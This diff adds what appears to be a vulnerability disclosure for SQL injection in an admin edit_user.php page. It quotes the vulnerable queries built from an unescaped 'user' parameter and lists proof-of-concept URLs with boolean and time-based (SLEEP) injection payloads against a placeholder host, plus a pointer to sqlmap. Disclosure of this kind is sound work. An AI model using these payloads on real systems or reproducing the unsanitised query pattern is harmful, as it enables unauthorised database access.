@@ -1,0 +1,37 @@
+affected source code file: /admin/edit_user.php
+--------------------------------
+affected source code:
+
+  <?php
+    .....
+    if (empty($errors)) {
+
+        $id = mysql_prep($_GET['user']);
+        if ($_POST['password'] != "") {
+            $password = mysql_prep($_POST['password']);
+            $h_password = sha1($password);
+        } else {
+            $query = "SELECT h_password FROM users WHERE id = {$id}";
+     .....
+     <?php
+        $query = "SELECT * FROM users WHERE id = '{$_GET['user']}'";
+        $result = mysql_query($query);
+        confirm_query($result);
+        $userData = mysql_fetch_array($result);
+     ?>
+     .....
+  ?>
+--------------------------------
+affected position: 
+      $id = mysql_prep($_GET['user']);
+      $query = "SELECT h_password FROM users WHERE id = {$id}";
+      $query = "SELECT * FROM users WHERE id = '{$_GET['user']}'";
+
+      We can see the $user and $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in edit_user.php
+--------------------------------
+affected executable: 
+  Like this: http://xx.xx.com/admin/edit_user.php?user=1 and 1=1
+             http://xx.xx.com/admin/edit_user.php?user=1 and 1=2
+             http://xx.xx.com/admin/edit_user.php?user=1 RLIKE SLEEP(2)
+             
+Then, we can use tools like sqlmap for more information.
